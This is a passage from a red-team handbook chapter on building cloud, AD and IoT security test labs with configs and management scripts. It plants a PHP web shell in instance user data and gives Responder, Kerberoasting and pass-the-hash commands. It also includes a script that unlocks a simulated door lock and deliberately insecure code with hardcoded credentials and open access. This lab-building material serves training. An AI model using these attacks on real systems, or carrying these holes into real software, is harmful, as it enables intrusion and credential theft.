echo "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key --keyring /usr/share/keyrings/cloud.google.gpg add -
sudo apt-get update && sudo apt-get install google-cloud-sdk

# Initialize gcloud
gcloud init

# Create directory for GCP lab resources
mkdir -p ~/gcp-security-lab
cd ~/gcp-security-lab
```

#### Deployment Manager Template for GCP Lab

Create a Deployment Manager template for a vulnerable GCP environment:

```yaml
# vulnerable-gcp-lab.yaml
resources:
- name: vulnerable-vpc
  type: compute.v1.network
  properties:
    autoCreateSubnetworks: false

- name: vulnerable-subnet
  type: compute.v1.subnetwork
  properties:
    network: $(ref.vulnerable-vpc.selfLink)
    ipCidrRange: 10.0.0.0/24
    region: us-central1

- name: vulnerable-firewall
  type: compute.v1.firewall
  properties:
    network: $(ref.vulnerable-vpc.selfLink)
    sourceRanges: ["0.0.0.0/0"]
    allowed:
    - IPProtocol: tcp
      ports: ["22", "80", "443", "3306", "1433"]
    - IPProtocol: icmp

- name: vulnerable-instance
  type: compute.v1.instance
  properties:
    zone: us-central1-a
    machineType: zones/us-central1-a/machineTypes/e2-medium
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-10
    networkInterfaces:
    - subnetwork: $(ref.vulnerable-subnet.selfLink)
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
    metadata:
      items:
      - key: startup-script
        value: |
          #!/bin/bash
          apt-get update
          apt-get install -y apache2 php mysql-server
          # Install vulnerable web application
          cd /var/www/html
          apt-get install -y git
          git clone https://github.com/OWASP/DVWA.git dvwa
          chown -R www-data:www-data /var/www/html/dvwa

- name: vulnerable-storage-bucket
  type: storage.v1.bucket
  properties:
    location: US
    iamConfiguration:
      uniformBucketLevelAccess:
        enabled: false
    acl:
    - entity: allUsers
      role: READER

outputs:
- name: instance-external-ip
  value: $(ref.vulnerable-instance.networkInterfaces[0].accessConfigs[0].natIP)
- name: storage-bucket-name
  value: $(ref.vulnerable-storage-bucket.name)
```

#### Deploying and Managing the GCP Lab

```bash
# Deploy the resources
gcloud deployment-manager deployments create red-team-lab --config vulnerable-gcp-lab.yaml

# Get deployment info
gcloud deployment-manager deployments describe red-team-lab

# SSH into the vulnerable instance
gcloud compute ssh vulnerable-instance --zone=us-central1-a
```

#### Automated GCP Lab Management

Create a management script for your GCP lab:

```bash
#!/bin/bash
# gcp-security-lab-manager.sh
# GCP Security Testing Lab Manager

DEPLOYMENT_NAME="red-team-lab"
TEMPLATE_FILE="$HOME/gcp-security-lab/vulnerable-gcp-lab.yaml"

function check_gcloud() {
    if ! command -v gcloud &> /dev/null; then
        echo "[-] gcloud CLI not found. Please install it."
        exit 1
    fi
    
    if ! gcloud auth list --filter=status:ACTIVE --format="value(account)" &> /dev/null; then
        echo "[-] gcloud CLI not configured. Please run 'gcloud init'."
        exit 1
    fi
}

function deploy_lab() {
    echo "[+] Deploying GCP security testing lab..."
    gcloud deployment-manager deployments create $DEPLOYMENT_NAME --config $TEMPLATE_FILE
    
    if [ $? -eq 0 ]; then
        echo "[+] Deployment complete!"
        get_lab_info
    else
        echo "[-] Deployment failed. Check GCP console for details."
    fi
}

function get_lab_info() {
    echo "[+] Security Lab Information:"
    gcloud deployment-manager deployments describe $DEPLOYMENT_NAME
    
    echo "[+] Instance IP:"
    gcloud compute instances describe vulnerable-instance --zone=us-central1-a --format="value(networkInterfaces[0].accessConfigs[0].natIP)"
}

function destroy_lab() {
    echo "[+] Destroying GCP security testing lab..."
    gcloud deployment-manager deployments delete $DEPLOYMENT_NAME --quiet
    
    if [ $? -eq 0 ]; then
        echo "[+] Lab environment destroyed successfully."
    else
        echo "[-] Issue with lab destruction. Check GCP console."
    fi
}

function check_lab_status() {
    echo "[+] Checking lab status..."
    status=$(gcloud deployment-manager deployments describe $DEPLOYMENT_NAME --format="value(state)" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        echo "[+] Lab status: $status"
    else
        echo "[+] Lab is not currently deployed."
    fi
}

function access_instance() {
    echo "[+] Accessing vulnerable instance..."
    gcloud compute ssh vulnerable-instance --zone=us-central1-a
}

function show_menu() {
    echo "=============================================="
    echo "      GCP Security Testing Lab Manager        "
    echo "=============================================="
    echo "1. Deploy Lab Environment"
    echo "2. Check Lab Status"
    echo "3. Get Lab Information"
    echo "4. Access Vulnerable Instance"
    echo "5. Destroy Lab Environment"
    echo "6. Exit"
    echo "=============================================="
    read -p "Select an option: " choice
    
    case $choice in
        1) deploy_lab ;;
        2) check_lab_status ;;
        3) get_lab_info ;;
        4) access_instance ;;
        5) destroy_lab ;;
        6) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    
    read -p "Press Enter to continue..."
    show_menu
}

# Main
check_gcloud
show_menu
```

> **RED TEAM TIP:**
>
> When creating cloud-based testing environments, use Infrastructure as Code templates with versioning to create reproducible scenarios. This allows you to rapidly deploy environments with specific vulnerabilities to practice targeted techniques, and to evolve your lab environments alongside real-world threat landscapes.

## Customized Security Testing Ranges

Building custom security ranges enables complex scenarios that span multiple technology stacks, providing the most realistic testing environment. This section covers building integrated security testing ranges that combine various technologies.

### Multi-Platform Security Range

Create a comprehensive security range that includes diverse technologies:

#### Setting Up the Test Infrastructure

```bash
# Create directory structure for the range
mkdir -p ~/security-range/{scripts,configs,evidence,templates}
cd ~/security-range
```

#### Range Configuration with Terraform

Create a Terraform configuration for a multi-technology range:

```hcl
# main.tf
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 3.0"
    }
    docker = {
      source  = "kreuzwerker/docker"
      version = "~> 2.0"
    }
  }
}

provider "aws" {
  region = "us-east-1"
}

provider "docker" {}

# Local Docker resources
resource "docker_network" "internal_network" {
  name = "security_range_network"
}

resource "docker_container" "kali_container" {
  name  = "kali-testing"
  image = "kalilinux/kali-rolling:latest"
  restart = "unless-stopped"
  
  networks_advanced {
    name = docker_network.internal_network.name
  }
  
  ports {
    internal = 22
    external = 2222
  }
  
  volumes {
    host_path      = "${path.cwd}/shared"
    container_path = "/shared"
  }
  
  command = ["sleep", "infinity"]
}

resource "docker_container" "vulnerable_webapp" {
  name  = "vulnerable-webapp"
  image = "vulnerables/web-dvwa:latest"
  
  networks_advanced {
    name = docker_network.internal_network.name
  }
  
  ports {
    internal = 80
    external = 8080
  }
}

# AWS resources
resource "aws_vpc" "range_vpc" {
  cidr_block = "10.0.0.0/16"
  
  tags = {
    Name = "SecurityRangeVPC"
  }
}

resource "aws_subnet" "range_subnet" {
  vpc_id     = aws_vpc.range_vpc.id
  cidr_block = "10.0.1.0/24"
  
  tags = {
    Name = "SecurityRangeSubnet"
  }
}

resource "aws_instance" "vulnerable_instance" {
  ami           = "ami-0c55b159cbfafe1f0"  # Amazon Linux 2
  instance_type = "t2.micro"
  subnet_id     = aws_subnet.range_subnet.id
  
  user_data = <<-EOF
              #!/bin/bash
              yum update -y
              yum install -y httpd mysql mariadb-server php
              systemctl start httpd
              systemctl enable httpd
              cd /var/www/html
              echo "<?php system(\$_GET['cmd']); ?>" > backdoor.php
              EOF
  
  tags = {
    Name = "VulnerableInstance"
  }
}

# Output important information
output "kali_ssh_port" {
  value = "SSH to localhost:2222"
}

output "dvwa_url" {
  value = "http://localhost:8080"
}

output "aws_instance_id" {
  value = aws_instance.vulnerable_instance.id
}
```

#### Automation for a Comprehensive Range

Create a management script for your security testing range:

```bash
#!/bin/bash
# security-range-manager.sh
# Comprehensive Security Testing Range Manager

RANGE_DIR="$HOME/security-range"
TERRAFORM_FILE="$RANGE_DIR/main.tf"

function check_dependencies() {
    echo "[+] Checking dependencies..."
    
    if ! command -v terraform &> /dev/null; then
        echo "[-] Terraform not found. Installing..."
        curl -fsSL https://apt.releases.hashicorp.com/gpg | sudo apt-key add -
        sudo apt-add-repository "deb [arch=amd64] https://apt.releases.hashicorp.com $(lsb_release -cs) main"
        sudo apt-get update
        sudo apt-get install -y terraform
    fi
    
    if ! command -v docker &> /dev/null; then
        echo "[-] Docker not found. Please install Docker."
        exit 1
    fi
    
    if ! command -v aws &> /dev/null; then
        echo "[-] AWS CLI not found. Please install AWS CLI."
        exit 1
    fi
}

function setup_range() {
    echo "[+] Setting up security testing range..."
    mkdir -p "$RANGE_DIR/shared"
    
    if [ ! -f "$TERRAFORM_FILE" ]; then
        echo "[+] Creating Terraform configuration..."
        # (Insert the Terraform configuration here)
    fi
    
    echo "[+] Initializing Terraform..."
    cd "$RANGE_DIR"
    terraform init
    
    echo "[+] Range setup complete. Use 'deploy_range' to deploy."
}

function deploy_range() {
    echo "[+] Deploying security testing range..."
    cd "$RANGE_DIR"
    
    terraform apply -auto-approve
    
    if [ $? -eq 0 ]; then
        echo "[+] Range deployed successfully!"
        terraform output
    else
        echo "[-] Range deployment failed. Check Terraform output for details."
    fi
}

function destroy_range() {
    echo "[+] Destroying security testing range..."
    cd "$RANGE_DIR"
    
    terraform destroy -auto-approve
    
    if [ $? -eq 0 ]; then
        echo "[+] Range destroyed successfully."
    else
        echo "[-] Issue with range destruction. Check Terraform output."
    fi
}

function access_kali() {
    echo "[+] Accessing Kali container..."
    docker exec -it kali-testing /bin/bash
}

function prepare_kali() {
    echo "[+] Preparing Kali container with essential tools..."
    docker exec -it kali-testing bash -c "apt update && apt install -y nmap metasploit-framework exploitdb dirb sqlmap hydra"
    echo "[+] Kali container prepared."
}

function run_scenario() {
    local scenario=$1
    
    echo "[+] Running security testing scenario: $scenario"
    case $scenario in
        "web-pentest")
            echo "[+] Web Penetration Testing Scenario"
            echo "[+] Target: http://vulnerable-webapp"
            echo "[+] Accessing Kali container..."
            docker exec -it kali-testing bash -c "apt update && apt install -y dirb sqlmap nikto && bash"
            ;;
        "network-scan")
            echo "[+] Network Scanning Scenario"
            echo "[+] Targets: All containers in the security_range_network"
            echo "[+] Accessing Kali container..."
            docker exec -it kali-testing bash -c "apt update && apt install -y nmap masscan && bash"
            ;;
        "aws-pentest")
            echo "[+] AWS Penetration Testing Scenario"
            echo "[+] Target: AWS resources in the security range"
            echo "[+] Accessing Kali container with AWS tools..."
            docker exec -it kali-testing bash -c "apt update && apt install -y awscli python3-pip && pip3 install pacu && bash"
            ;;
        *)
            echo "[-] Unknown scenario: $scenario"
            echo "Available scenarios: web-pentest, network-scan, aws-pentest"
            ;;
    esac
}

function show_menu() {
    echo "=================================================="
    echo "      Comprehensive Security Testing Range         "
    echo "=================================================="
    echo "1. Setup Range Environment"
    echo "2. Deploy Range"
    echo "3. Prepare Kali Container"
    echo "4. Access Kali Container"
    echo "5. Run Testing Scenario"
    echo "6. Destroy Range"
    echo "7. Exit"
    echo "=================================================="
    read -p "Select an option: " choice
    
    case $choice in
        1) setup_range ;;
        2) deploy_range ;;
        3) prepare_kali ;;
        4) access_kali ;;
        5) 
           echo "Available scenarios:"
           echo "1. Web Penetration Testing"
           echo "2. Network Scanning"
           echo "3. AWS Penetration Testing"
           read -p "Select scenario: " scenario_choice
           
           case $scenario_choice in
               1) run_scenario "web-pentest" ;;
               2) run_scenario "network-scan" ;;
               3) run_scenario "aws-pentest" ;;
               *) echo "Invalid scenario choice" ;;
           esac
           ;;
        6) destroy_range ;;
        7) exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    
    read -p "Press Enter to continue..."
    show_menu
}

# Main
check_dependencies
show_menu
```

### Specialized AD and Domain Testing

Create an Active Directory environment for testing domain-based attacks:

#### Vagrant Configuration for AD Environment

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  # Windows Domain Controller
  config.vm.define "dc" do |dc|
    dc.vm.box = "gusztavvargadr/windows-server-2019-standard"
    dc.vm.hostname = "dc"
    dc.vm.network "private_network", ip: "192.168.56.10"
    
    dc.vm.provider "virtualbox" do |vb|
      vb.memory = "2048"
      vb.cpus = 2
      vb.name = "AD-DC"
    end
    
    # Provision with PowerShell to set up AD
    dc.vm.provision "shell", inline: <<-SHELL
      # Install AD DS role
      Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
      
      # Configure as a new domain
      Import-Module ADDSDeployment
      $securePassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
      
      Install-ADDSForest `
        -CreateDnsDelegation:$false `
        -DatabasePath "C:\\Windows\\NTDS" `
        -DomainMode "WinThreshold" `
        -DomainName "redteamlab.local" `
        -DomainNetbiosName "REDTEAMLAB" `
        -ForestMode "WinThreshold" `
        -InstallDns:$true `
        -LogPath "C:\\Windows\\NTDS" `
        -NoRebootOnCompletion:$true `
        -SysvolPath "C:\\Windows\\SYSVOL" `
        -SafeModeAdministratorPassword:$securePassword `
        -Force:$true
      
      # Create test users and groups
      Add-ADUser -Name "John Smith" -GivenName "John" -Surname "Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@redteamlab.local" -AccountPassword $securePassword -Enabled $true
      Add-ADUser -Name "Jane Doe" -GivenName "Jane" -Surname "Doe" -SamAccountName "jdoe" -UserPrincipalName "jdoe@redteamlab.local" -AccountPassword $securePassword -Enabled $true
      Add-ADUser -Name "Admin User" -GivenName "Admin" -Surname "User" -SamAccountName "adminuser" -UserPrincipalName "adminuser@redteamlab.local" -AccountPassword $securePassword -Enabled $true
      
      # Add adminuser to Domain Admins
      Add-ADGroupMember -Identity "Domain Admins" -Members "adminuser"
      
      # Configure weak Kerberos settings for testing
      Set-ADUser -Identity "jsmith" -KerberosEncryptionType RC4
      
      # Reboot to apply changes
      Restart-Computer -Force
    SHELL
  end
  
  # Windows Client
  config.vm.define "client" do |client|
    client.vm.box = "gusztavvargadr/windows-10-enterprise"
    client.vm.hostname = "client"
    client.vm.network "private_network", ip: "192.168.56.20"
    
    client.vm.provider "virtualbox" do |vb|
      vb.memory = "2048"
      vb.cpus = 2
      vb.name = "AD-Client"
    end
    
    # Provision with PowerShell to join domain
    client.vm.provision "shell", inline: <<-SHELL
      # Set DNS to point to the domain controller
      netsh interface ip set dns "Ethernet 2" static 192.168.56.10
      
      # Join the domain
      $securePassword = ConvertTo-SecureString "Password123!" -AsPlainText -Force
      $credential = New-Object System.Management.Automation.PSCredential("REDTEAMLAB\\adminuser", $securePassword)
      
      Add-Computer -DomainName "redteamlab.local" -Credential $credential -Restart -Force
    SHELL
  end
  
  # Kali Linux for testing
  config.vm.define "kali" do |kali|
    kali.vm.box = "kalilinux/rolling"
    kali.vm.hostname = "kali"
    kali.vm.network "private_network", ip: "192.168.56.100"
    
    kali.vm.provider "virtualbox" do |vb|
      vb.memory = "4096"
      vb.cpus = 2
      vb.name = "AD-Kali"
    end
    
    # Provision with tools for AD testing
    kali.vm.provision "shell", inline: <<-SHELL
      apt-get update
      apt-get install -y bloodhound impacket-scripts responder crackmapexec
      
      # Set up hosts file for domain
      echo "192.168.56.10 dc.redteamlab.local" >> /etc/hosts
      echo "192.168.56.20 client.redteamlab.local" >> /etc/hosts
    SHELL
  end
end
```

#### Running AD Attacks

Once the environment is set up, you can practice various AD attacks:

```bash
# From the Kali machine, run BloodHound to map domain
sudo neo4j start
bloodhound

# Use SharpHound to collect domain data (from Windows client)
# Import data into BloodHound to analyze attack paths

# Run Responder to capture NTLM hashes
sudo responder -I eth1 -wrf

# Use Impacket for various attacks
# Get service tickets
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py redteamlab.local/jsmith:Password123! -dc-ip 192.168.56.10 -request

# Pass-the-Hash attack
python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32196b56ffe6f45e294117b91a83bf38 redteamlab.local/adminuser@192.168.56.10
```

### IoT Testing Environment

Create a specialized environment for IoT testing:

#### Raspberry Pi and ESP32 Based Lab

For physical IoT testing:

```bash
# Create configuration for a physical IoT lab
cat > iot-lab-setup.sh << 'EOF'
#!/bin/bash
# IoT Lab Setup Script

# Create directory structure
mkdir -p ~/iot-lab/{firmware,tools,captures,evidence}
cd ~/iot-lab

# Install essential tools
sudo apt-get update
sudo apt-get install -y gqrx-sdr gnuradio hackrf rtl-sdr build-essential python3-pip
pip3 install esptool pyserial

# Set up RFCrack
cd tools
git clone https://github.com/cclabsInc/RFCrack.git
cd RFCrack
pip3 install -r requirements.txt
cd ..

# Set up tools for ESP32 analysis
git clone https://github.com/espressif/esptool.git

# Set up tools for firmware analysis
git clone https://github.com/craigz28/firmwalker.git
chmod +x firmwalker/firmwalker.sh

# Set up tools for Zigbee analysis
git clone https://github.com/riverloopsec/killerbee.git
cd killerbee
pip3 install .
cd ..

echo "[+] IoT lab setup complete!"
EOF

chmod +x iot-lab-setup.sh
```

#### Emulated IoT Environment

For software emulation of IoT devices:

```bash
# Create a docker-compose file for emulated IoT environment
cat > docker-compose-iot.yml << 'EOF'
version: '3'

services:
  # MQTT Broker
  mosquitto:
    image: eclipse-mosquitto:latest
    container_name: mqtt-broker
    ports:
      - "1883:1883"
      - "9001:9001"
    volumes:
      - ./mosquitto/config:/mosquitto/config
      - ./mosquitto/data:/mosquitto/data
      - ./mosquitto/log:/mosquitto/log
    networks:
      iot_network:
        ipv4_address: 172.18.0.2

  # Simulated Smart Home Hub
  smarthome-hub:
    image: python:3.9-slim
    container_name: smarthome-hub
    volumes:
      - ./smarthome:/app
    working_dir: /app
    command: sh -c "pip install paho-mqtt flask && python hub.py"
    depends_on:
      - mosquitto
    networks:
      iot_network:
        ipv4_address: 172.18.0.3

  # Simulated IoT Devices
  iot-devices:
    build: ./devices
    container_name: iot-devices
    volumes:
      - ./devices:/app
    working_dir: /app
    command: sh -c "pip install paho-mqtt requests && python simulator.py"
    depends_on:
      - mosquitto
      - smarthome-hub
    networks:
      iot_network:
        ipv4_address: 172.18.0.4

  # Kali for testing
  kali:
    image: kalilinux/kali-rolling:latest
    container_name: kali-iot
    tty: true
    stdin_open: true
    volumes:
      - ./shared:/shared
    command: bash -c "apt-get update && apt-get install -y nmap mosquitto-clients python3-pip && pip3 install paho-mqtt scapy && tail -f /dev/null"
    networks:
      iot_network:
        ipv4_address: 172.18.0.100

networks:
  iot_network:
    driver: bridge
    ipam:
      config:
        - subnet: 172.18.0.0/16
EOF

# Create dummy IoT device code
mkdir -p devices
cat > devices/simulator.py << 'EOF'
import paho.mqtt.client as mqtt
import json
import time
import random
import threading

# Simulated devices
devices = {
    "temperature_sensor": {
        "id": "temp001",
        "type": "temperature",
        "location": "living_room",
        "auth_token": "abcdef123456" # Insecure hardcoded token
    },
    "light_switch": {
        "id": "light001",
        "type": "switch",
        "location": "bedroom",
        "state": False,
        "auth_token": "insecure_token_123"
    },
    "door_lock": {
        "id": "lock001",
        "type": "lock",
        "location": "front_door",
        "state": "locked", 
        "auth_token": "super_secret_token_111"
    }
}

# Connect to MQTT broker
client = mqtt.Client()
client.connect("mosquitto", 1883, 60)
client.loop_start()

# Handle commands
def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())
        device_id = msg.topic.split('/')[1]
        
        print(f"Received command for {device_id}: {data}")
        
        # Insecure handling of commands - no proper validation
        if 'state' in data:
            for device in devices.values():
                if device['id'] == device_id:
                    device['state'] = data['state']
                    print(f"Set {device_id} state to {data['state']}")
                    # Acknowledge state change
                    client.publish(f"iot/ack/{device_id}", json.dumps({
                        "status": "success",
                        "state": device['state']
                    }))
    except Exception as e:
        print(f"Error processing message: {e}")

client.on_message = on_message
client.subscribe("iot/cmd/#")

# Simulate sensor data
def temp_sensor_loop():
    while True:
        temp = random.uniform(18.0, 26.0)
        client.publish(f"iot/sensor/{devices['temperature_sensor']['id']}", 
                      json.dumps({
                          "temperature": round(temp, 1),
                          "humidity": random.uniform(30.0, 60.0),
                          "battery": random.uniform(50.0, 100.0),
                          "token": devices['temperature_sensor']['auth_token']
                      }))
        time.sleep(30)

# Start simulation threads
threading.Thread(target=temp_sensor_loop, daemon=True).start()

print("IoT device simulator running. Press Ctrl+C to exit.")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    client.loop_stop()
    client.disconnect()
EOF

# Create a Dockerfile for the devices
cat > devices/Dockerfile << 'EOF'
FROM python:3.9-slim

WORKDIR /app
RUN pip install paho-mqtt requests
COPY . .

CMD ["python", "simulator.py"]
EOF

# Create a smart home hub application
mkdir -p smarthome
cat > smarthome/hub.py << 'EOF'
from flask import Flask, request, jsonify
import paho.mqtt.client as mqtt
import json
import threading
import time

app = Flask(__name__)

# Device registry - would be a database in a real system
devices = {}
users = {
    "admin": "admin123", # Insecure default credentials
    "user": "password"
}

# Connect to MQTT
mqtt_client = mqtt.Client()
mqtt_client.connect("mosquitto", 1883, 60)
mqtt_client.loop_start()

# Insecure API endpoint - no authentication required
@app.route('/api/devices', methods=['GET'])
def get_devices():
    return jsonify(devices)

# Insecure API endpoint - no CSRF protection
@app.route('/api/device/control', methods=['POST'])
def control_device():
    data = request.json
    
    if not data or 'device_id' not in data or 'command' not in data:
        return jsonify({"error": "Missing required fields"}), 400
    
    device_id = data['device_id']
    command = data['command']
    
    # Publish command to device
    mqtt_client.publish(f"iot/cmd/{device_id}", json.dumps(command))
    
    return jsonify({"status": "Command sent"})

# Handle device registrations
def on_message(client, userdata, msg):
    topic = msg.topic
    
    # Auto-register any device that sends data
    if topic.startswith("iot/sensor/"):
        device_id = topic.split('/')[2]
        try:
            data = json.loads(msg.payload.decode())
            if device_id not in devices:
                devices[device_id] = {
                    "id": device_id,
                    "last_seen": time.time()
                }
            devices[device_id].update(data)
            devices[device_id]["last_seen"] = time.time()
        except Exception as e:
            print(f"Error processing message: {e}")

mqtt_client.on_message = on_message
mqtt_client.subscribe("iot/sensor/#")
mqtt_client.subscribe("iot/ack/#")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
EOF

mkdir -p mosquitto/config
cat > mosquitto/config/mosquitto.conf << 'EOF'
listener 1883
allow_anonymous true
EOF

# Create a script to run IoT attacks
cat > iot-attacks.sh << 'EOF'
#!/bin/bash
# IoT Attack Script

echo "========================================"
echo "        IoT Environment Attacks         "
echo "========================================"
echo "1. MQTT Topic Enumeration"
echo "2. MQTT Unauthorized Publishing"
echo "3. Sniff IoT Communication"
echo "4. Smart Hub API Attack"
echo "5. Return to main menu"
echo "========================================"
read -p "Select an option: " choice

case $choice in
    1)
        echo "[+] Enumerating MQTT topics..."
        docker exec -it kali-iot mosquitto_sub -h mosquitto -t "#" -v
        ;;
    2)
        echo "[+] Injecting unauthorized MQTT messages..."
        read -p "Device ID to target (e.g., light001): " device_id
        docker exec -it kali-iot mosquitto_pub -h mosquitto -t "iot/cmd/$device_id" -m '{"state":"on"}'
        echo "[+] Command injected. Check device status."
        ;;
    3)
        echo "[+] Sniffing IoT traffic with tcpdump..."
        docker exec -it kali-iot apt-get update
        docker exec -it kali-iot apt-get install -y tcpdump
        docker exec -it kali-iot tcpdump -i eth0 port 1883 -vv
        ;;
    4)
        echo "[+] Attacking Smart Hub API..."
        docker exec -it kali-iot apt-get install -y curl
        docker exec -it kali-iot curl -X POST -H "Content-Type: application/json" -d '{"device_id":"lock001","command":{"state":"unlocked"}}' http://smarthome-hub:5000/api/device/control
        echo "[+] API request sent. Check device status."
        ;;
    5)
        echo "Returning to main menu..."
        ;;
    *)
        echo "Invalid option"
        ;;
esac
EOF

chmod +x iot-attacks.sh
```

> **RED TEAM TIP:**
>
> When building specialized test environments, create consistent documentation and runbooks alongside your infrastructure code. This ensures repeatability and knowledge transfer, allowing your entire team to leverage the environments effectively for education, tool development, and offensive technique refinement.

## Conclusion

Specialized test environments are essential for developing and refining red team skills without risking production systems. The approaches covered in this chapter—virtual labs, containerized environments, cloud-based platforms, and customized testing ranges—provide a comprehensive toolkit for creating realistic, isolated environments that support the full spectrum of red team operations.

When developing your own specialized environments, remember these key principles:

1. **Infrastructure as Code**: Use automation to ensure reproducibility and version control
2. **Isolated Networking**: Create separate networks to prevent unintended access
3. **Realistic Configurations**: Replicate real-world misconfigurations and vulnerabilities
4. **Diverse Technologies**: Include various platforms to practice cross-domain attacks
5. **Resource Efficiency**: Use appropriate virtualization techniques based on testing needs

By investing in specialized test environments, red teams can continuously enhance their skills, safely test new tools and techniques, and provide more valuable security assessments for their organizations. These environments serve not only as testing grounds but also as educational platforms for developing the next generation of security professionals.

In the appendices that follow, we'll provide additional resources, custom scripts, and references to help you further develop your red team toolkit and capabilities.

## Additional Resources

- [VirtualBox Documentation](https://www.virtualbox.org/wiki/Documentation)
- [Vagrant Documentation](https://www.vagrantup.com/docs)
- [Docker Security Testing Lab](https://github.com/opsxcq/docker-vulnerable-dvwa)
- [Kubernetes Security Project](https://kubernetes.io/docs/concepts/security/)
- [Terraform Documentation](https://www.terraform.io/docs)
- [AWS CloudFormation Templates](https://aws.amazon.com/cloudformation/resources/templates/)
- [GCP Deployment Manager Templates](https://cloud.google.com/deployment-manager/docs/configuration/templates/examples)
- [OWASP Vulnerable Web Applications Directory](https://owasp.org/www-project-vulnerable-web-applications-directory/)
- [Vulhub - Docker-Compose files for vulnerable environments](https://github.com/vulhub/vulhub)
- [Detection Lab - Security lab environment](https://github.com/clong/DetectionLab)
- [Active Directory Security Lab](https://github.com/dievus/adlab)
- [IoT Security Testing Methodology](https://www.owasp.org/index.php/IoT_Security_Testing_Methodology)
